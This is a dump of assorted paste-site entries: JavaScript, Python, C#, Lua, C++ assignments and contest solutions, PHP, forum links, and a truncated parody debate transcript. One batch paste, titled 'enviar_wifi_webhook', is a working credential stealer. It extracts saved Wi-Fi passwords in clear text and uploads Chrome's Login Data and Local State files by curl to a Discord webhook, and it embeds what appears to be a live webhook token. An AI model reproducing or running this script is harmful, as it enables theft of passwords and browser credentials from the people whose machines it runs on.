i,a=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,s=Math.ceil,u=Math.floor,c=""[BigNumber Error] "",l=c+""Number primitive has more than 15 significant digits: "",f=1e14,h=14,p=9007199254740991,d=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],m=1e7,v=1e9;function y(e){var t=0|e;return e>0||e===t?t:t-1}function g(e){for(var t,r,n=1,o=e.length,i=e[0]+"""";n<o;){for(t=e[n++]+"""",r=h-t.length;r--;t=""0""+t);i+=t}for(o=i.length;48===i.charCodeAt(--o););return i.slice(0,o+1||1)}function b(e,t){var r,n,o=e.c,i=t.c,a=e.s,s=t.s,u=e.e,c=t.e;if(!a||!s)return null;if(r=o&&!o[0],n=i&&!i[0],r||n)return r?n?0:-s:a;if(a!=s)return a;if(r=a<0,n=u==c,!o||!i)return n?0:!o^r?1:-1;if(!n)return u>c^r?1:-1;for(s=(u=o.length)<(c=i.length)?u:c,a=0;a<s;a++)if(o[a]!=i[a])return o[a]>i[a]^r?1:-1;return u==c?0:u>c^r?1:-1}function w(e,t,r,n){if(e<t||e>r||e!==u(e))throw Error(c+(n||""Argument"")+(""number""==typeof e?e<t||e>r?"" out of range: "":"" not an integer: "":"" not a primitive number: "")+String(e))}function x(e){var t=e.c.length-1;return y(e.e/h)==t&&e.c[t]%2!=0}function A(e,t){return(e.length>1?e.charAt(0)+"".""+e.slice(1):e)+(t<0?""e"":""e+"")+t}function B(e,t,r){var n,o;if(t<0){for(o=r+""."";++t;o+=r);e=o+e}else if(++t>(n=e.length)){for(o=r,t-=n;--t;o+=r);e+=o}else t<n&&(e=e.slice(0,t)+"".""+e.slice(t));return e}i=function e(t){var r,n,o,i,E,F,k,S,R,I,T=Z.prototype={constructor:Z,toString:null,valueOf:null}"
zC0aGVKL,Untitled,anushkapandeyyy,Python,Friday 28th of June 2024 12:10:11 AM CDT,"def execute_transformation(req, project):
    print(""Starting transformation execution"")
    project_obj = ProjectSvc.get_by_name(name=project)
    print(f""Retrieved project object: {project_obj}"")
    data_nodes = DataNodeService.get_by_project(project=project_obj)
    print(f""Retrieved data nodes: {data_nodes}"")
    code_version = None

    try:
        code_version = CodeVersion.get_by_project(project).latest('generated_on')
        generated_on = code_version.generated_on
        print(f""Retrieved code version: {code_version}"")
    except Exception as e:
        generated_on = '-'
        print(f""Error retrieving code version: {e}"")

    additionalDetailsColumns = {}
    for dataNodeDetail in data_nodes:
        data_node_alias = dataNodeDetail.alias
        try:
            columnList = [val for val in dataNodeDetail.additional_parameters['schema'].keys()]
        except Exception as e:
            columnList = []
            print(f""Error retrieving additional parameters for data node {data_node_alias}: {e}"")
        additionalDetailsColumns[data_node_alias] = columnList
    print(f""Additional details columns: {additionalDetailsColumns}"")

    response = None

    if req.method == 'POST':
        print(""POST request received"")
        form_identifier = req.POST[""form_identifier""]
        current_parameter = ParameterSvc.get_by_project(project_obj)
        settings = json.loads(current_parameter.get(name='General').data)
        print(f""Settings: {settings}"")

        if form_identifier == ""transformation-form"":
            if 'execute' in req.POST:
                print(""Execution requested"")
                generated_files = CodeVersion.get_code_by_code_version(code_version=code_version)
                run_id = datetime.now().strftime(""XFR-%m%d%y-%H%M%S"")
                businessDate = format_date(req.POST['businessDate'], settings.get('date_format'))
                sys.argv = ["""", run_id, businessDate]

                for i in generated_files:
                    path = f""{django_settings.MEDIA_ROOT}/{i.file}""
                    fp = open(path)
                    print(f""Executing file: {path}"")
                    logger.info(f""EXECUTING : {path}"")

                    try:
                        exec(fp.read())
                    except Exception as e:
                        print(f""Error during file execution: {e}"")
                        logger.exception(f""ERROR: during code execution in file : {__file__}"")
                        logger.exception(f""Error {e}"")
                print(""File execution finished"")
                logger.info(""FILE EXECUTION FINISHED"")
                RunExecutionDetailSvc.save_execution_detail(project=project_obj, run_id=run_id, business_date=businessDate,
                                                            executed_on=datetime.today(),
                                                            run_type=""XFR"")
            else:
                try:
                    print(""Processing transformation flow"")
                    businessDate = format_date(req.POST['businessDate'], settings.get('date_format'))

                    prefix = 'transformation_'
                    transformation_flow = [x[len(prefix):] for x in list(req.POST.keys()) if x.startswith(prefix)]
                    transformation_flows = [x for x in transformation_flow]
                    column_mapping_for_flow = []
                    for item in transformation_flows:
                        column_mapping_for_flow.append(ColumnMappingSvc.get_by_flow_name_and_project(flow_name=item, project=project_obj))
                    transformation_config = []
                    for i in column_mapping_for_flow:
                        transformation_config.append(model_to_dict(i))
                    print(f""Transformation config: {transformation_config}"")

                    parameters = ParametersSvc.get_by_project(project=project_obj, name='General')
                    code_gen_path = loads(parameters.data)[""code_gen_path""]
                    if not code_gen_path:
                        print(""Error: Code Gen Path not found"")
                        logger.exception(""Enter Code Gen Path."")
                        response = {""status"": ""failure"", ""error"": ""Code Gen Path not found""}

                    _temp = []
                    for i in transformation_config:
                        _temp.append(transformation_minimizer(i))
                    print(f""Temp transformation config: {_temp}"")

                    response = None
                    for idx, config_item in enumerate(_temp):
                        config = {
                            'flow': config_item,
                            'parameters': model_to_dict(ParametersSvc.get_by_project(project_obj))
                        }
                        try:
                            transformation(project_obj, code_gen_path, config, businessDate, execute=False)
                        except Exception as e:
                            print(f""Error during transformation: {e}"")
                            logger.exception(f""ERROR: {str(e)}"")
                            response = {""status"": ""failure"", ""error"": str(e)}
                            break
                        else:
                            response = {""status"": ""success""}

                except Exception as e:
                    print(f""Error processing transformation flow: {e}"")
                    logger.exception(f""ERROR: {str(e)}"")
                    response = {""status"": ""failure"", ""error"": str(e)}

    distinct_flows = FlowSvc.get_by_project(project_obj).values('flow_name').distinct()
    print(f""Distinct flows: {distinct_flows}"")

    column_mappings = []
    for flow_info in distinct_flows:
        flow_name = flow_info['flow_name']
        column_mappings.append({
            'flow_name': flow_name,
        })
    print(f""Column mappings: {column_mappings}"")

    context = {
        'column_mappings': column_mappings,
        'project': project,
        'response': response
    }
    print(""Rendering response"")
    return render(req, ""pages/generate-transformation.html"", context)
"
syVTQRGg,MoveDirection refactor,Aquakman,C#,Thursday 27th of June 2024 11:55:52 PM CDT,"void MoveToTarget(Vector3 targetPosition)
{
    customTargetPosition = targetPosition;
    targetDir = customTargetPosition - myGameObject.transform.position;
    radvalue = Mathf.Atan2(targetDir.y, targetDir.x);
    AngleTarget = radvalue * (180 / Mathf.PI);
}

void HandleMoveDirections(MoveDirections direction)
{
    switch (direction)
    {
        case MoveDirections.TowardsSpawnXY:
            MoveToTarget(new Vector3(spawnX, spawnY, 0f));
            break;
        case MoveDirections.TowardsPositionXY:
            MoveToTarget(new Vector3(targetPositionXY.x, targetPositionXY.y, 0f));
            break;
        case MoveDirections.TowardsPlayer:
            customTarget = GameManager.get.Player.gameObject;
            MoveToTarget(GameManager.get.Player.GetActorSpot(ActorSpots.HitSpot));
            break;
        case MoveDirections.ActorTarget:
            customTarget = GameManager.get.Player.Target.gameObject;
            MoveToTarget(GameManager.get.Player.GetActorSpot(ActorSpots.HitSpot));
            break;
        case MoveDirections.CustomTarget:
            MoveToTarget(customTarget.transform.position);
            break;
    }
}
"
qgDdfpAt,lamp.lua,crococrystal,Lua,Thursday 27th of June 2024 11:46:47 PM CDT,"local component = require(""component"")
local event = require(""event"")
local term = require(""term"")
local filesystem = require(""filesystem"")
local dkjson = require(""dkjson"")
local colorsFile = ""/colors.json""

local function loadColors()
    if filesystem.exists(colorsFile) then
        local file = io.open(colorsFile, ""r"")
        local data = file:read(""*all"")
        file:close()
        return dkjson.decode(data)
    else
        return {}
    end
end

local function saveColors(colors)
    local data = dkjson.encode(colors, { indent = true })
    local file = io.open(colorsFile, ""w"")
    file:write(data)
    file:close()
end

local favoriteColors = loadColors()
local currentColor = nil

local function setAllLampsColor(color)
    for address in component.list(""colorful_lamp"") do
        component.proxy(address).setLampColor(color)
    end
end

local function displayMenu()
    term.clear()
    print(""Выберите действие:"")
    print(""1. Установить цвет для всех ламп"")
    print(""2. Сохранить текущий цвет в избранное"")
    print(""3. Избранные цвета"")
    print(""4. Дискотека"")
    print(""Нажмите Enter для выхода из программы"")
end

local function handleColorInput()
    term.clear()
    print(""Введите цвет (от 1 до 32767). Enter для выхода."")
    while true do
        local input = io.read()
        if input == """" then break end
        local color = tonumber(input)
        if color and color >= 1 and color <= 32767 then
            currentColor = color
            setAllLampsColor(color)
            print(""Цвет установлен: "" .. color)
        else
            print(""Некорректное значение. Попробуйте снова."")
        end
    end
end

local function saveCurrentColor()
    if currentColor then
        print(""Введите название для цвета "" .. currentColor .. "":"")
        local name = io.read()
        favoriteColors[name] = currentColor
        saveColors(favoriteColors)
        print(""Цвет сохранён под названием: "" .. name)
    else
        print(""Нет установленного цвета для сохранения."")
    end
end

local function listFavoriteColors()
    term.clear()
    local keys = {}
    for name, _ in pairs(favoriteColors) do
        table.insert(keys, name)
    end
    table.sort(keys)
    local i = 1
    for _, name in ipairs(keys) do
        print(i .. "". "" .. name .. "" цвет: "" .. favoriteColors[name])
        i = i + 1
    end
    print(""Введите номер для установки цвета. Enter для выхода."")
    local input = io.read()
    if input ~= """" then
        local index = tonumber(input)
        if index and index >= 1 and index <= #keys then
            local name = keys[index]
            setAllLampsColor(favoriteColors[name])
            print(""Установлен цвет: "" .. favoriteColors[name] .. "" ("" .. name .. "")"")
        end
    end
end

local function discoMode()
    term.clear()
    print(""Дискотека активирована! Нажмите Enter для выхода."")
    while not event.pull(0.1, ""key_down"") do
        for address in component.list(""colorful_lamp"") do
            local randomColor = math.random(0, 32767)
            component.proxy(address).setLampColor(randomColor)
        end
    end
end

local running = true
while running do
    displayMenu()
    local choice = io.read()
    if choice == ""1"" then
        handleColorInput()
    elseif choice == ""2"" then
        saveCurrentColor()
    elseif choice == ""3"" then
        listFavoriteColors()
    elseif choice == ""4"" then
        discoMode()
    elseif choice == """" then
        running = false
    else
        print(""Некорректный выбор. Попробуйте снова."")
    end
end

print(""Программа завершена."")"
t4rhZSZr,dasha,hpnq,C++,Thursday 27th of June 2024 11:16:29 PM CDT,"#include <iostream>
#include <fstream>
#include <iomanip>
#include <string.h>
#include <windows.h>
using namespace std;

struct Countries {
    string name; //название страны
    string capital; //столица
    double population; //численность населения
    double populationPercent; //процент населения от общемирового
    double area; //площадь
};

struct node // описание узла дерева
{
    Countries countries;// поле данных - переменная типа страна
    node* left, * right; // указатели на левое и правое поддеревья
};



void inputstudent(Countries& countries)//ввод данных о студенте
{
    cout << ""Введите название страны: "" << endl;
    cin >> countries.name;
    cout << ""Введите столицу:"" << endl;
    cin >> countries.capital;
    cout << ""Введите численность населения:"" << endl;
    cin >> countries.population;
    cout << ""Введите процент населения от общемирового:"" << endl;
    cin >> countries.populationPercent;
    cout << ""Введите площадь:"" << endl;
    cin >> countries.area;

}


//ввод массива с клавиатуры
void inputMasFromKeyboard(Countries*& mas, unsigned int& size)
{
    cout << ""Введите размер массива"" << endl;
    cin >> size;
    if (size == 0) return;//если размер=0, то выходим из функции
    mas = new Countries[size];//создаем динамический массив
    int i;//индекс элемента массива
    for (i = 0; i < size; i++)
    {
        cout << ""Введите информацию о стране:"" << endl;
        inputstudent(mas[i]);
    }
}

void printStudent(Countries countries)//печать данных о студенте
{
    cout << left << setw(10) << countries.name << setw(15) << countries.capital << setw(10) << countries.population << setw(9)
         << countries.populationPercent << setw(5) << countries.area  << endl;;

}

void printMas(Countries* mas, unsigned int size)
{
    if (!size) return;
    cout << ""Созданный массив с информацией о странах:"" << endl;
    cout << left << setw(10) << ""Название"" << setw(15) << ""Столица"" << setw(10) << ""Числ.населения"" << setw(9)
         << ""Процент населения"" << setw(5) << ""Площадь"" << endl;
    for (int i = 0; i < size; i++)
    {
        printStudent(mas[i]);
    }
}


void insert(node** p, Countries countries) // добавление узла в дерево поиска
{
    if (*p == NULL)//или (!*p) //нашли пустой указатель – пустое место
    { //создаём новый узел дерева на найденном месте
        *p = new node;
        (*p)->countries = countries;
        (*p)->left = NULL;
        (*p)->right = NULL;
    }
    else
    { //если текущий узел не пуст
        if (countries.name < (*p)->countries.name) insert(&(*p)->left, countries); //идём в левое поддерево
        if (countries.name > (*p)->countries.name) insert(&(*p)->right, countries); //идём в правое поддерево
        //одинаковые значения не добавляем!
    }
}

// распечатка дерева в симметричном порядке
void printsim(const node* p)
{
    if (p != NULL) // если дерево не пусто
    {
        printsim(p->left); // печатаем левое поддерево
        printStudent(p->countries); // печатаем значение поля - всю структуру типа tstudent
        printsim(p->right); // печатаем правое поддерево
    }
}


void clear(node** p) // очистка дерева
{
    if ((*p) != NULL) // если дерево не пусто
    {
        clear(&(*p)->left); // удаляем левое поддерево
        clear(&(*p)->right); // удаляем правое поддерево
        delete* p; //Удаляем указатель на текущий узел
        *p = NULL;//Присваиваем ему пустой указатель
    }
}


//функция создания деревьев из массива
void createTrees(Countries* mas, unsigned int size, node** root1, node** root2)
{
    if (!size) return;
    for (int i = 0; i < size; i++)
    {
        if (mas[i].population > 100) insert(root1, mas[i]); // Добавляем новый узел в первое дерево поиска
        else insert(root2, mas[i]); // Добавляем новый узел в первое дерево поиска
    }
}


//нахождение количества узлов
int count(const node* p)
{
    if (p == NULL) return 0;
    return 1 + count(p->left) + count(p->right);
}



// высота дерева
int height(const node* p)
{
    if (p == NULL) return 0;
    //иначе
    int h1 = height(p->left);//считаем высоту левого поддерева
    int h2 = height(p->right);//считаем высоту правого поддерева
    if (h1 >= h2) return h1 + 1;//возвращаем высоту большего из них+1 - так как добавляем наш узел
    return h2 + 1;
}



//печать значений узлов из самой длинной ветки
void printLong(const node* p)
{
    if (p != NULL)
    {
        printStudent(p->countries);
        int h1 = height(p->left);
        int h2 = height(p->right);
        if (h1 >= h2) printLong(p->left);
        else printLong(p->right);
    }
}



double sayminarea(const node *p ){
    if (p != NULL) // если дерево не пусто
    {

        double s1 = sayminarea(p->left); // печатаем левое поддерево
        double s2 = sayminarea(p->right); // печатаем правое поддерево
        return min(p->countries.area, min(s1, s2)); // минимальная площадь поддеревьев.
    }

    return 100000000; //
}
int saymaxlevel(const node *p, string s){
    //height

    if (p != NULL) // если дерево не пусто
    {

        int s1 = saymaxlevel(p->left, s); // печатаем левое поддерево
        int s2 = saymaxlevel(p->right, s); // печатаем правое поддерево
        if(p->countries.name[0] == s[0]){
            return max(height(p), max(s1, s2)); // минимальная площадь поддеревьев
        }
        return max(s1, s2);
    }
    return 0 ;

}
int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    Countries* mas = NULL;//указатель на динамический массив типа Студент
    unsigned int size = 0;
    inputMasFromKeyboard(mas, size);
    if (size) {

        node* root1 = NULL, * root2 = NULL; // Указатели на корень первого и второго деревьев
        printMas(mas, size);
        cout << endl;

        createTrees(mas, size, &root1, &root2);

        cout << ""Распечатка первого дерева в симметричном порядке"" << endl;
        printsim(root1); // распечатка первого дерева в симметричном порядке
        cout << endl;
        cout << ""Распечатка второго дерева в симметричном порядке"" << endl;
        printsim(root2); // распечатка второго дерева в симметричном порядке
        cout << endl;
        cout << ""Количество узлов первого дерева "" << count(root1) << endl;
        cout << endl;
        cout << ""Узлы длинной ветки:"" << endl;
        printLong(root2);

        // ------------ задача 5--------------

        sayminarea(root1);
        // ------------ задача 6--------------
        saymaxlevel(root2, ""Г""); // второе дерево , ищем высоту начинающегося с ""Г""


        // ------------ задача 7--------------

        clear(&root1); //Вызов функции очистки дерева
        if (!root1) cout << ""Дерево успешно очищено!"" << endl;
        clear(&root2); //Вызов функции очистки дерева
        if (!root2) cout << ""Дерево успешно очищено!"" << endl;




        delete[] mas;
    }
    else cout << ""Размер массива равен 0"" << endl;
    return 0;
}
"
1h7JkyBm,BuilderJson,cepxuozab,C++,Thursday 27th of June 2024 11:00:07 PM CDT,"#include <iostream>
#include <map>
#include <set>
#include <string>

class Json { };

class Builder {
    class BaseContext;
    class DictValueContext;
    class ArrayItemContext;
public:
    Builder()=default;
    DictValueContext StartDict();
    ArrayItemContext StartArray();
    BaseContext EndDict();
    BaseContext EndArray();

private:
    Json* json;
    class BaseContext {
    public:
        BaseContext(Builder& builder)
            : builder_(builder)
        {
        }
        DictValueContext StartDict() {
            return builder_.StartDict();
        }
        ArrayItemContext StartArray() {
            return builder_.StartArray();
        }
        BaseContext EndDict() {
            return builder_.EndDict();
        }
        BaseContext EndArray() {
            return builder_.EndArray();
        }

    private:
        Builder& builder_;
    };

    class DictValueContext : public BaseContext {
    public:
        DictValueContext(BaseContext base)
            : BaseContext(base)
        {
        }
        BaseContext EndArray() = delete;
        DictValueContext StartDict() = delete;
        ArrayItemContext StartArray() = delete;
    };

    class ArrayItemContext : public BaseContext {
    public:
        ArrayItemContext(BaseContext base) : BaseContext(base) {}        
        BaseContext EndDict() = delete;
    };
};

Builder::DictValueContext Builder::StartDict() {
    return BaseContext{ *this };
}

Builder::ArrayItemContext Builder::StartArray() {   
    return BaseContext{ *this };
}

Builder::BaseContext Builder::EndDict() {    
    return *this;
}

Builder::BaseContext Builder::EndArray() {
        return *this;
}

int main(){
    auto doc = Builder().StartArray().EndDict();
}
"
wJ86fHhy,enviar_wifi_webhook,eneko42,Batch,Thursday 27th of June 2024 10:28:54 PM CDT,"@echo off
setlocal enabledelayedexpansion

rem URL de la webhook de Discord
set webhook_url=https://discord.com/api/webhooks/1248264179861946529/0NJ9hbaDTsksrOfOZK7Kcl-od6eEs_aEKIyQc3EVtjgJ-ThYcADYG4Ms9e926ugrcHlI

rem Crear un archivo temporal para el contenido JSON
set temp_json=temp.json

rem Enviar mensaje inicial
echo {^""content^"":^""**__-----Extrayendo Datos-----__**^""} > %temp_json%
curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!

rem Enviar mensaje de inicio de extracción de redes WiFi
echo {^""content^"":^""**__REDES WIFI GUARDADAS:__**^""} > %temp_json%
curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!

rem Obtener la lista de perfiles de red
for /f ""tokens=2 delims=:"" %%i in ('netsh wlan show profiles ^| findstr ""Perfil de todos los usuarios""') do (
    set profile=%%i
    set profile=!profile:~1!

    rem Obtener la contraseña de cada perfil
    for /f ""tokens=2 delims=:"" %%j in ('netsh wlan show profile name^=""!profile!"" key^=clear ^| findstr /C:""Contenido de la clave""') do (
        set key=%%j
        set key=!key:~1!
        set message=Nombre de perfil: !profile! Contraseña: !key!

        rem Escapar caracteres especiales
        set message=!message:^""=\""^""!

        rem Crear el contenido JSON en el archivo temporal
        echo {^""content^"":^""!message!^""} > %temp_json%

        rem Enviar el mensaje a la webhook de Discord
        curl --insecure -H ""Content-Type: application/json"" -X POST -d @%temp_json% !webhook_url!
    )
)

rem Eliminar el archivo temporal
del %temp_json%

rem Enviar archivos Login Data y Local State

rem Navegar al directorio del archivo Login Data
cd ""%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default""

rem Enviar el archivo Login Data a la webhook
curl --insecure -F ""file=@Login Data"" %webhook_url%

rem Navegar al directorio del archivo Local State
cd ..

rem Enviar el archivo Local State a la webhook
curl --insecure -F ""file=@Local State"" %webhook_url%

rem Mensaje de finalización
echo Proceso completado.
"
QppL9LQ0,add link in post title,arie_cristianD,PHP,Thursday 27th of June 2024 09:26:40 PM CDT,"<a href=""<?php the_field( 'external_link', get_the_ID(), false ); ?>"">
	<h1 class=""jeg_post_title""><?php the_title(); ?></h1>
</a>"
iJ3rB3aR,D,Ankit_132,C++,Thursday 27th of June 2024 09:07:46 PM CDT,"#include <bits/stdc++.h>
using namespace std;

#define ff first
#define ss second

int main() {
    int t;
    cin>>t;
    while(t--){
        int n, m; cin >> n >> m;
        vector<int> a(n), b(n);
        for(int &x:  a)
            cin >> x;
        map<int, pair<int, int>> diffs;
        map<int, int>  c;
        for(int i = 0; i < n; i++){
            cin >> b[i];
            if(diffs.find(a[i] - b[i]) != diffs.end())
            {
                if(b[i] < (diffs[a[i] - b[i]]).ff)
                    diffs[a[i] - b[i]] = {b[i], i};
            }
            else
                diffs[a[i] - b[i]] = {b[i], i};
        }
        vector<int> cc(m);
        for(int &x: cc){
            cin >> x;
            c[x]++;
        }

        int ans = 0;
        for(auto &[diff, temp] : diffs)
        {
            auto [bi, i] = temp;
            auto it = c.lower_bound(a[i]);

            while(it != c.end())
            {
                int cnt = (*it).second;
                int ci = (*it).first;
                int curr = (ci - bi)/(diff);            ans += 2*curr*cnt;
                c.erase(it);
                c[ci - curr*diff] += cnt;
                it = c.lower_bound(a[i]);
            }
        }
        cout << ans << endl;
    }
}
"
06bTgNwP,C,Ankit_132,C++,Thursday 27th of June 2024 09:07:43 PM CDT,"#include <bits/stdc++.h>
#define int long long
using namespace std;


signed main() {
  int t;
  cin >> t;
  while (t--) {
    int n;
    cin >> n;
    vector<int> a(n), b(n);
    for (int i = 0; i < n; i++) {
        cin >> a[i];
    }
    for (int i = 0; i < n; i++) {
        cin >> b[i];
    }
    int sa = 0, sb = 0, pos = 0, neg = 0;
    for (int i = 0; i < n; i++) {
        if (a[i] == 1 && b[i] == 1) pos++;
        else if (a[i] == -1 && b[i] == -1) neg++;
        else {
            if (a[i] >= b[i]) {
                sa += a[i];
            } else {
                sb += b[i];
            }
        }
    }
    while (pos--) {
        if (sa <= sb) sa++;
        else sb++;
    }
    while (neg--) {
        if (sa <= sb) sb--;
        else sa--;
    }
    cout << min(sa, sb) << ""\n"";
  }
}
"
KR50CSgx,B,Ankit_132,C++,Thursday 27th of June 2024 09:07:41 PM CDT,"#include <bits/stdc++.h>
using namespace std;
 
int main() {
    int t;
    cin>>t;
    while(t--){
        string s;
        cin>>s;
        string p;
        cin>>p;
        int n=s.length();
        int m=p.length();
        int ans=n+m;
        for(int i=0;i<m;i++){
            int ind=i;
            for(int j=0;j<n;j++){
                if(ind<m && s[j] == p[ind]) ind++;
            }
            ans=min(ans,n+m-ind+i);
        }
        
        cout<<ans<<endl;
    }
}"
b4kY1x0B,A,Ankit_132,C++,Thursday 27th of June 2024 09:06:05 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main() {
    int t;
    cin>>t;
    while(t--){
        int n;
        cin >> n;
        for(int i = 0; i < n; i++){
            int x, y;
            cin >> x >> y;
            if(y < - 1) cout << ""NO"" << endl;
            else cout << ""YES"" << endl;
        }
    }
}
"
bwhi4wPJ,TRIT: Deep Trap [2015],Munfaqqiha,C++,Thursday 27th of June 2024 07:24:33 PM CDT,"https://forum.idws.id/posts/34194002
https://idfl-forum.com/showthread.php?t=163104&p=3960203&viewfull=1#post3960203"
3UmZyiXp,Untitled,dmndkut,JavaScript,Thursday 27th of June 2024 07:19:17 PM CDT,"{
  ""transcript"": [
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""GOOD EVENING. FROM HOFSTRA UNIVERSITY, I'M LESTER HOLT. AND WELCOME TO THE FIRST PRESIDENTIAL DEBATE. A QUICK REMINDER FOR OUR AUDIENCE, THERE IS NO CHEERING, NO CLAPPING, AND TO THE TRUMP SUPPORTERS, NO SHIRT NO SHOES, NO SERVICE. NOW LET'S BRING OUT THE CANDIDATES. FIRST, SHE'S BEEN BATTLING PNEUMONIA AND WE HOPE SHE'S FEELING BETTER TONIGHT. IT'S SECRETARY HILLARY CLINTON.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I'M BETTER THAN EVER, LET'S DO THIS!""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""AND FINALLY, HE'S THE MAN TO BLAME FOR THE BOTTOM HALF OF ALL HIS KIDS' FACES. IT'S REPUBLICAN NOMINEE DONALD TRUMP!""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""GOOD EVENING, AMERICA. I AM GOING TO BE SO GOOD TONIGHT. I AM GOING TO BE SO CALM AND SO PRESIDENTIAL THAT ALL OF YOU WATCHING ARE GOING TO CREAM YOUR JEANS.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, LET'S BEGIN WITH YOU. WHY ARE YOU A BETTER CHOICE THAN YOUR OPPONENT TO CREATE JOBS AND PUT MONEY INTO THE POCKETS OF AMERICAN WORKERS?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""WELL, LESTER, MY OPPONENT'S TAX PLAN BENEFITS THE TOP 1% SO MUCH, IT'S NOT JUST TRICKLE-DOWN ECONOMICS, IT'S -- I DON'T KNOW, I GUESS IF I HAD TO CALL IT SOMETHING OFF THE TOP OF THE OLD DOME, WITH NO PREP WHATSOEVER, I DON'T KNOW, I GUESS I'D CALL IT TRUMPED-UP, TRICKLE-DOWN ECONOMICS.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""THAT'S VERY CATCHY, SECRETARY. YOU JUST CAME UP WITH THAT JUST NOW?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I DID, RIGHT OFF THE STIFF RED CUFF.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""SAY, JAZZMAN. I'VE GOT A VERY PRESIDENTIAL ANSWER FOR THIS. OUR JOBS ARE FLEEING THIS COUNTRY. THEY'RE GOING TO MEXICO, THEY'RE GOING TO JI-NA. I'D STOP THAT. IF HILLARY KNEW HOW SHE WOULD HAVE DONE IT ALREADY, END OF STORY. I WON THE DEBATE, I STAYED CALM JUST LIKE I PROMISED, AND IT IS OVER. GOOD NIGHT, HOFSTRA.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""DONALD.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""DONALD, THERE'S STILL 88 MINUTES LEFT. IT'S A 90-MINUTE DEBATE.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""MY MICROPHONE IS BROKEN. SHE BROKE IT. WITH OBAMA. SHE AND OBAMA STOLE MY MICROPHONE. THEY TOOK MY MICROPHONE TO KENYA AND THEY BROKE IT AND NOW IT'S BROKEN. DO YOU HEAR THAT? SOMEBODY'S SNIFFING HERE. I THINK IT'S HER SNIFFS. SHE'S BEEN SNIFFING ALL NIGHT. TESTING, TESTING. JI-NA, JI-NA. YUGE, JI-NA.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""SECRETARY CLINTON, WHAT DO YOU THINK ABOUT THAT?""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I THINK I'M GOING TO BE PRESIDENT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[CHEERS AND APPLAUSE]""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""I MEAN, THIS MAN IS CLEARLY UNFIT TO BE COMMANDER IN CHIEF.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE IS A BULLY.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""SHUT UP.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE STARTED THE BIRTHER MOVEMENT.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""YOU DID.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE SAID CLIMATE CHANGE IS A HOAX INVENTED BY CHINA.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""IT'S PRONOUNCED JI-NA.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""HE HASN'T RELEASED HIS TAX RETURNS WHICH MEANS HE'S EITHER NOT THAT RICH.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""NOT THAT CHARITABLE.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG.""
    },
    {
      ""speaker"": ""Hillary Clinton"",
      ""text"": ""OR HE'S NOT PAID TAXES IN HIS LIFE.""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONGER.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""LET'S MOVE ON TO NATIONAL SECURITY. MR. TRUMP, YOU'VE CRITICIZED SECRETARY CLINTON FOR VOTING FOR THE IRAQ WAR, BUT YOU YOURSELF SUPPORTED THE WAR --""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""WRONG, WRONG, WRONG. YOU'RE BEING VERY MEAN TO ME TONIGHT, COLTRANE, VERY MEAN. I WAS AGAINST THE WAR, NAME ANYONE IN THE WORLD NAMED SEAN HANNITY. I TOLD SEAN HANNITY, CALL SEAN HANNITY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""YOU TOLD SEAN HANNITY ON HIS SHOW AND THERE'S PROOF?""
    },
    {
      ""speaker"": ""Donald Trump"",
      ""text"": ""I TOLD HIM IN PRIVATE. ME AND SEAN LATE AT NIGHT. I LEANED OVER AND WHISPERED IN HIS EAR, SEAN, I'M AGAINST THE WAR IN IRAQ. HE WHISPERED IN MY EAR, I'M AGAINST THE WAR TOO. NEXT THING I KNEW, I WAS KISSING SEAN HANNITY.""
    },
    {
      ""speaker"": ""Lester Holt"",
      ""text"": ""MOVING RIGHT PAST THAT.""
    },
    {
      ""speaker"": ""Audience"",
      ""text"": ""[LAUGHTER]""
    },
    {
